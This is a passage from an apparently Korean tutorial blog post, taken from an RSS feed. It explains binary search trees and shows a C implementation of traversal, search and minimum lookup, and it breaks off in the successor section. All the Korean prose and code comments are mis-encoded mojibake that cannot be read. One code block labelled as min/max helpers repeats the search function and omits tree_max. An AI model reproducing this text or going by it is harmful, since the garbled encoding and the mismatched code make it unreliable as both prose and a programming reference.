      <content:encoded><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">ê°œìš”</h2><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì •ì˜ì™€ ì„±ì§ˆì„ ì‚´í´ë³´ê³  êµ¬í˜„í•´ ë³´ê² ìŠµë‹ˆë‹¤.</p><h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC%EB%9E%80" tabindex="-1">ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ë€</h2><h3 id="%EC%A0%95%EC%9D%98%EC%99%80-%EC%84%B1%EC%A7%88" tabindex="-1">ì •ì˜ì™€ ì„±ì§ˆ</h3><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬(binary search tree)ëŠ” ì´ì§„ íŠ¸ë¦¬ë©´ì„œ, ë‹¤ìŒê³¼ ê°™ì€ ì¬ê·€ì ì¸ ì„±ì§ˆì„ ê°€ì§„ íŠ¸ë¦¬ì…ë‹ˆë‹¤.</p><blockquote><p>ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì™¼ìª½ íŠ¸ë¦¬ì— ìˆëŠ” ë…¸ë“œë“¤ì€ ë” ì‘ì€ í‚¤(key)ë¥¼ ê°€ì§„ë‹¤. ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì— ìˆëŠ” ë…¸ë“œë“¤ì€ ë” í° í‚¤ë¥¼ ê°€ì§„ë‹¤.</p></blockquote><p>ì„±ì§ˆì—ì„œ ì•Œ ìˆ˜ ìˆë“¯, ì´ì§„ íƒìƒ‰  íŠ¸ë¦¬ëŠ” í‚¤-ê°’(key-value)ì˜ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” ìë£Œêµ¬ì¡°ì…ë‹ˆë‹¤. ì´ ê¸€ì—ì„œëŠ” í¸ì˜ìƒ í‚¤ì™€ ê°’ì€ ëª¨ë‘ ì •ìˆ˜ì´ë©°, ë‘ ê°’ì´ ê°™ì•„ê³  ê°€ì •í•˜ê² ìŠµë‹ˆë‹¤. ì•„ë˜ ê·¸ë¦¼ì˜ ë‘ íŠ¸ë¦¬ëŠ” ëª¨ë‘ ìœ„ì˜ ì„±ì§ˆì„ ë§Œì¡±í•˜ëŠ” ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì…ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/1.png" alt="1.png"></p><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ëŠ” ì„±ì§ˆ ìƒ íƒìƒ‰, ì‚½ì…, ì‚­ì œ ë“± ì—°ì‚°ì˜ ì‹œê°„ ë³µì¡ë„ê°€ íŠ¸ë¦¬ì˜ ë†’ì´ì— ë¹„ë¡€í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ê°™ì€ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” íŠ¸ë¦¬ë¼ë„ í˜•íƒœì— ë”°ë¼ ë³µì¡ë„ì˜ ì°¨ì´ê°€ ìƒê¸¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¼ì—ì„œ ì™¼ìª½ì˜ ê²½ìš° <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>ì˜ ì‹œê°„ ë³µì¡ë„ë¥¼ ê°–ì§€ë§Œ, ì˜¤ë¥¸ìª½ê³¼ ê°™ì´ ë¹„íš¨ìœ¨ì ì¸ ê²½ìš° ìµœì•…ì—ëŠ” <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>ì˜ ë³µì¡ë„ë¥¼ ê°–ê²Œ ë©ë‹ˆë‹¤.</p><h3 id="%EA%B5%AC%EC%A1%B0%EC%B2%B4%EC%99%80-%ED%95%A8%EC%88%98-%EC%84%A0%EC%96%B8" tabindex="-1">êµ¬ì¡°ì²´ì™€ í•¨ìˆ˜ ì„ ì–¸</h3><p>ìë£Œêµ¬ì¡° êµ¬í˜„ì€ ëª¨ë‘ Cì–¸ì–´ë¡œ í•˜ê² ìŠµë‹ˆë‹¤. íŠ¸ë¦¬ì˜ ë…¸ë“œì— í•´ë‹¹í•˜ëŠ” <code>Node</code> êµ¬ì¡°ì²´ëŠ” í‚¤ì™€ ê°’ì„ ë‚˜íƒ€ë‚´ëŠ” <code>key</code> ì™€ <code>value</code> , ê°ê° ì™¼ìª½ ìì‹, ì˜¤ë¥¸ìª½ ìì‹, ë¶€ëª¨ ë…¸ë“œë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° <code>left</code> , <code>right</code> , <code>parent</code> ë¥¼ ë©¤ë²„ë¡œ ê°€ì§‘ë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ë¥¼ ë‚˜íƒ€ë‚´ëŠ” <code>BST</code> êµ¬ì¡°ì²´ëŠ” ë£¨íŠ¸ ë…¸ë“œë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° <code>root</code> ë¥¼ ë©¤ë²„ë¡œ ê°€ì§‘ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line"><span class="type">int</span> key, value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>, *<span class="title">right</span>, *<span class="title">parent</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTree</span> &#123;</span></span><br><span class="line">Node *root;</span><br><span class="line">&#125; BST;</span><br></pre></td></tr></table></figure><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì—°ì‚°ì„ êµ¬í˜„í•˜ê¸° ìœ„í•œ í•¨ìˆ˜ë“¤ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ëª¨ë“  ë…¸ë“œë¥¼ í‚¤ ìˆœìœ¼ë¡œ ì¶œë ¥í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ì£¼ì–´ì§„ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ì•„ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *<span class="title function_">search</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// í‚¤ ìˆœìœ¼ë¡œ ì •ë ¬í–ˆì„ ë•Œ í•˜ë‚˜ ì‘ì€ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// í‚¤ ìˆœìœ¼ë¡œ ì •ë ¬í–ˆì„ ë•Œ í•˜ë‚˜ í° í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ì‚½ì…í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ì£¼ì–´ì§„ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì‚­ì œí•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br></pre></td></tr></table></figure><p>ìœ„ì˜ í•¨ìˆ˜ë“¤ì„ êµ¬í˜„í•˜ê¸° ìœ„í•´ ë‚´ë¶€ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ë‚´ì¥ í•¨ìˆ˜ë“¤ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. í•¨ìˆ˜ ì´ë¦„ ì•ì— ì–¸ë”ìŠ¤ì½”ì–´(underscore) ë‘ ê°œê°€ ë¶™ì–´ ìˆìœ¼ë©´ ë‚´ì¥ í•¨ìˆ˜ë¡œ êµ¬ë¶„í•˜ê² ìŠµë‹ˆë‹¤. ì´ í•¨ìˆ˜ë“¤ì˜ í•„ìš”ì„±ê³¼ ì“°ì„ì— ëŒ€í•´ì„œëŠ” ë°‘ì—ì„œ í•˜ë‚˜ì”© ì‚´í´ë³¼ ì˜ˆì •ì…ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì¤‘ìœ„ ìˆœíšŒí•˜ë©° í‚¤ì™€ ê°’ì„ ì¶œë ¥í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ í•˜ìœ„ íŠ¸ë¦¬ì—ì„œ ì£¼ì–´ì§„ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ì•„ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì™¼ìª½ íŠ¸ë¦¬ì—ì„œ ê°€ì¥ ì‘ì€ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_min(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ ê°€ì¥ í° í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_max(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// í‚¤ ìˆœìœ¼ë¡œ ì •ë ¬í–ˆì„ ë•Œ ë…¸ë“œì˜ í‚¤ë³´ë‹¤ í•˜ë‚˜ ì‘ì€ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_predecessor(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// í‚¤ ìˆœìœ¼ë¡œ ì •ë ¬í–ˆì„ ë•Œ ë…¸ë“œì˜ í‚¤ë³´ë‹¤ í•˜ë‚˜ í° í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</span></span><br><span class="line">Node *__tree_successor(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// íŠ¸ë¦¬ì—ì„œ ë…¸ë“œ uì˜ ìœ„ì¹˜ì— ë…¸ë“œ vë¥¼ ëŒ€ì…í•©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v);</span><br></pre></td></tr></table></figure><h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EA%B5%AC%ED%98%84" tabindex="-1">ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ êµ¬í˜„</h2><h3 id="%ED%8A%B8%EB%A6%AC-%EC%88%9C%ED%9A%8C%ED%95%98%EA%B8%B0" tabindex="-1">íŠ¸ë¦¬ ìˆœíšŒí•˜ê¸°</h3><p>ì´ì œ ì œì¼ ì‰¬ìš´ í•¨ìˆ˜ë¶€í„° í•˜ë‚˜ì”© êµ¬í˜„í•´ ë´…ì‹œë‹¤. ê°€ì¥ ë¨¼ì € ìˆœíšŒëŠ” ì•„ì£¼ ì‰¬ìš´ë°, ì´ì§„ íŠ¸ë¦¬ë¥¼ ì¤‘ìœ„ ìˆœíšŒ(in-order)í•´ì£¼ë©´ ë©ë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆë¡œ ì¸í•´ í‚¤ê°€ ì‘ì€ ë…¸ë“œë¶€í„° ì •ë ¬ëœ ìˆœì„œë¡œ ìˆœíšŒí•˜ê²Œ ë©ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/2.png" alt="2.png"></p><p>ìˆœíšŒë¥¼ ìœ„í•œ ë‚´ì¥ í•¨ìˆ˜ <code>__tree_walk</code> ëŠ” ì¬ê·€ í˜¸ì¶œì„ ì´ìš©í•´ êµ¬í˜„í•©ë‹ˆë‹¤. ì™¼ìª½ íŠ¸ë¦¬ë¥¼ ì¬ê·€ì ìœ¼ë¡œ ìˆœíšŒí•˜ê³ , ìì‹ ì˜ í‚¤ì™€ ê°’ì„ ì¶œë ¥í•˜ê³ , ë‹¤ì‹œ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ë¥¼ ì¬ê·€ì ìœ¼ë¡œ ìˆœíšŒí•˜ëŠ” ë°©ì‹ì…ë‹ˆë‹¤. íŠ¸ë¦¬ì˜ ì¶œë ¥ì„ ìœ„í•œ <code>print</code> í•¨ìˆ˜ëŠ” ë£¨íŠ¸ ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ìˆœíšŒë¥¼ ìˆ˜í–‰í•˜ë©´ ë©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë‚´ì¥ í•¨ìˆ˜</span></span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x) &#123;</span><br><span class="line"><span class="keyword">if</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">__tree_walk(x-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x-&gt;key, x-&gt;value);</span><br><span class="line">__tree_walk(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span> &#123;</span><br><span class="line">__tree_walk(bst-&gt;root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="%ED%82%A4%EB%A5%BC-%EA%B0%80%EC%A7%84-%EB%85%B8%EB%93%9C-%EC%B0%BE%EA%B8%B0" tabindex="-1">í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œ ì°¾ê¸°</h3><p>ë‹¤ìŒì€ íƒìƒ‰ì…ë‹ˆë‹¤. íƒìƒ‰ì€ íŠ¹ì • í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ëŠ” ì—°ì‚°ìœ¼ë¡œ, ì‚¬ìš©í•˜ëŠ” ì–¸ì–´ê°€ ë”•ì…”ë„ˆë¦¬(dictionary), ë§µ(map), ì—°ê´€ ë°°ì—´(associative array) ê°™ì€ ì´ë¦„ì˜ ìë£Œêµ¬ì¡°ë¥¼ ì§€ì›í•œë‹¤ë©´ ìˆ±í•˜ê²Œ ì“°ëŠ” ì—°ì‚°ì…ë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ëŠ” ì´ì§„ íƒìƒ‰ì„ í†µí•´ í‰ê· ì ìœ¼ë¡œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> ì‹œê°„ì— íŠ¹ì • í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ê·¸ë¦¼ì€ ì´ì§„ íƒìƒ‰ì„ í†µí•´ í‚¤ <code>13</code> ì„ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ëŠ” ê³¼ì •ì„ ë‚˜íƒ€ë‚´ê³  ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/3.png" alt="3.png"></p><p>íƒìƒ‰ì„ ìœ„í•œ ë‚´ì¥ í•¨ìˆ˜ <code>__tree_search</code> ëŠ” ë…¸ë“œ <code>x</code> ì˜ í‚¤ì™€ ì£¼ì–´ì§„ <code>key</code> ë¥¼ ë°˜ë³µí•˜ì—¬ ë¹„êµí•©ë‹ˆë‹¤. ì£¼ì–´ì§„ <code>key</code> ê°€ ë” í¬ë‹¤ë©´ <code>x</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì„ <code>x</code> ì— ëŒ€ì…í•˜ì—¬ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ ë°˜ë³µì„ ê³„ì†í•©ë‹ˆë‹¤. <code>key</code> ê°€ ë” ì‘ì€ ê²½ìš° ì™¼ìª½ íŠ¸ë¦¬ì—ì„œ ë°˜ë³µì„ ê³„ì†í•©ë‹ˆë‹¤. ë°˜ë³µë¬¸ì˜ ì¢…ë£Œ ì¡°ê±´ìœ¼ë¡œ <code>x</code> ì˜ í‚¤ì™€ <code>key</code> ê°€ ì¼ì¹˜í•˜ë©´ ì„±ê³µì ìœ¼ë¡œ ì°¾ì€ ê²½ìš°ì…ë‹ˆë‹¤. <code>x</code> ê°€ <code>NULL</code> ì´ ë˜ëŠ” ê²½ìš°ëŠ” ì£¼ì–´ì§„ <code>key</code> ë¥¼ ì°¾ì§€ ëª»í•œ ê²½ìš°ì…ë‹ˆë‹¤.</p><p>íƒìƒ‰ ì—°ì‚°ì€ ì¼ë°˜ì ì¸ ì´ì§„ íƒìƒ‰ê³¼ ë§¤ìš° ìœ ì‚¬í•©ë‹ˆë‹¤. <code>__tree_walk</code> ì™€ ê°™ì´ ì¬ê·€ì ìœ¼ë¡œ êµ¬í˜„í•  ìˆ˜ë„ ìˆìœ¼ë‚˜, ë°˜ë³µì ìœ¼ë¡œ êµ¬í˜„í•˜ëŠ” ìª½ì´ í•¨ìˆ˜ í˜¸ì¶œê³¼ ë°˜í™˜ì— í•„ìš”í•œ ì‹œê°„ê³¼ ê³µê°„ì„ ì•„ë‚„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¸ë¦¬ì—ì„œì˜ íƒìƒ‰ ì—°ì‚°ì„ ìœ„í•œ <code>__search</code> í•¨ìˆ˜ëŠ” ë£¨íŠ¸ ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ íƒìƒ‰ì„ ìˆ˜í–‰í•˜ë©´ ë©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë‚´ì¥ í•¨ìˆ˜</span></span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">search</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_search(bst-&gt;root, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ê°™ì€ ì›ë¦¬ë¡œ ê°€ì¥ ì‘ì€ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•˜ëŠ” <code>__tree_min</code>, ê°€ì¥ í° í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ë°˜í™˜í•˜ëŠ” <code>__tree_max</code> ë‚´ì¥ í•¨ìˆ˜ë„ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì— ë”°ë¼ ì™¼ìª½ ìì‹ë§Œ ë”°ë¼ê°€ë©´ ê°€ì¥ ì‘ì€ í‚¤, ì˜¤ë¥¸ìª½ ìì‹ë§Œ ë”°ë¼ê°€ë©´ ê°€ì¥ í° í‚¤ê°€ ë‚˜ì˜¤ê²Œ ë©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_min(Node *x) &#123;</span><br><span class="line"><span class="keyword">while</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">x = x-&gt;left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="%EC%9D%B4%EC%A0%84%EA%B3%BC-%EB%8B%A4%EC%9D%8C-%EB%85%B8%EB%93%9C-%EC%B0%BE%EA%B8%B0" tabindex="-1">ì´ì „ê³¼ ë‹¤ìŒ ë…¸ë“œ ì°¾ê¸°</h3><p>ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ëŠ” ì •ë ¬ëœ ìë£Œêµ¬ì¡°ì…ë‹ˆë‹¤. ì •ë ¬ëœ ìë£Œêµ¬ì¡°ì—ì„œëŠ” íŠ¹ì • ë°ì´í„°ì˜ ì´ì „ ìˆœì„œë‚˜ ë‹¤ìŒ ìˆœì„œì˜ ë°ì´í„°ë¥¼ ì¡°íšŒí•´ì•¼ í•˜ëŠ” ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì„ í™œìš©í•˜ë©´, ì´ì „ ìˆœì„œë‚˜ ë‹¤ìŒ ìˆœì„œë¥¼ ì°¾ê¸° ìœ„í•´ í‚¤ë¥¼ ì„œë¡œ ë¹„êµí•˜ì§€ ì•Šê³ ë„ ì´ë“¤ ë…¸ë“œë¥¼ ì°¾ì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë¨¼ì € ë‹¤ìŒ ìˆœì„œë¥¼ ì°¾ëŠ” ì—°ì‚°ì„ ë³´ê² ìŠµë‹ˆë‹¤. ë‹¤ìŒ ìˆœì„œë¥¼ ì°¾ì„ ë•ŒëŠ” íŠ¸ë¦¬ì˜ í˜•íƒœì— ë”°ë¼ ê·¸ë¦¼ê³¼ ê°™ì´ ë‘ ê°€ì§€ ê²½ìš°ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. ê·¸ë¦¼ì˜ ì™¼ìª½ì€ <code>3</code> ì˜ ë‹¤ìŒ ë…¸ë“œ <code>4</code> ë¥¼ ì°¾ëŠ” ê³¼ì •ìœ¼ë¡œ, <code>3</code> ì˜ ì˜¤ë¥¸ìª½ ìì‹ì´ ì¡´ì¬í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì— ë”°ë¼, ì˜¤ë¥¸ìª½ ìì‹ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš° ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ í‚¤ê°€ ìµœì†Ÿê°’ì¸ ë…¸ë“œë¥¼ ì°¾ìœ¼ë©´ ë©ë‹ˆë‹¤. í˜„ì¬ ë…¸ë“œë³´ë‹¤ í‚¤ê°€ í° ë…¸ë“œë“¤ ì¤‘ì—ì„œ ê°€ì¥ ì‘ì€ ë…¸ë“œë¥¼ ì°¾ìœ¼ë©´ ê·¸ê²ƒì´ ë‹¤ìŒ ë…¸ë“œì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/4.png" alt="4.png"></p><p>ê·¸ë¦¼ì˜ ì˜¤ë¥¸ìª½ì€ <code>5</code> ì˜ ë‹¤ìŒ ë…¸ë“œê°€ <code>6</code> ì„ ì°¾ê³  ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° <code>5</code> ëŠ” ì˜¤ë¥¸ìª½ ìì‹ ë…¸ë“œê°€ ì—†ìŠµë‹ˆë‹¤. ì´ëŸ° ê²½ìš°ì—ë„ ìê¸°ë³´ë‹¤ í‚¤ê°€ ì‘ì€ ë…¸ë“œëŠ” ì™¼ìª½ íŠ¸ë¦¬, í° ë…¸ë“œëŠ” ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì— ì¡´ì¬í•œë‹¤ëŠ” ì„±ì§ˆì„ ì´ìš©í•©ë‹ˆë‹¤. ê¸°ì¤€ ë…¸ë“œì˜ ì¡°ìƒ ë…¸ë“œë“¤ì„ ì¡°íšŒí•˜ë©´ì„œ ê¸°ì¤€ ë…¸ë“œë¥¼ ì™¼ìª½ íŠ¸ë¦¬ì˜ ë…¸ë“œë¡œ ê°–ëŠ” ì²« ë²ˆì§¸ ì¡°ìƒì„ ì°¾ìœ¼ë©´, í‚¤ì˜ ë¹„êµ ì—†ì´ë„ ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”ìš± ë³µì¡í•œ ì´ ê²½ìš°ë„ ìµœì•…ì˜ ì‹œê°„ 